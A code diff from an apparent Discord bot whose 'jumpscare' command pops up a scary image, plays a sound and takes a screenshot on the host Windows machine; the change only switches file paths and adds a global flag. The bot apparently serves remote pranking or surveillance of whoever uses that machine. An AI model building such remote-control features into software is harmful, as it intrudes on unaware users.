@@ -764,12 +764,12 @@ async def jumpscare(interaction: nextcord.Interaction):
             n -= 1
         print("Jumpscare activated")
         await interaction.edit_original_message(content="Jumpscare activated!, sending jumpscare...")
-        img = cv2.imread(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'jumpscare', 'jumpscare.png'))
+        img = cv2.imread("jumpscare/jumpscare.png")
         print("Opening jumpscare image...")
         cv2.imshow("Jumpscare", img)
         print("Jumpscare image opened")
         print("Playing jumpscare sound...")
-        winsound.PlaySound(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'jumpscare' 'jumpscare.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)
+        winsound.PlaySound("jumpscare/jumpscare.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
         print("Taking screenshot...")
         await interaction.edit_original_message(content="Jumpscare activated!, taking screenshot...")
 
@@ -797,6 +797,7 @@ async def jumpscare(interaction: nextcord.Interaction):
         
 @client.event
 async def on_message(message):
+    global jumpscaring
 
     if not message.author.bot:
         if jumpscaring:
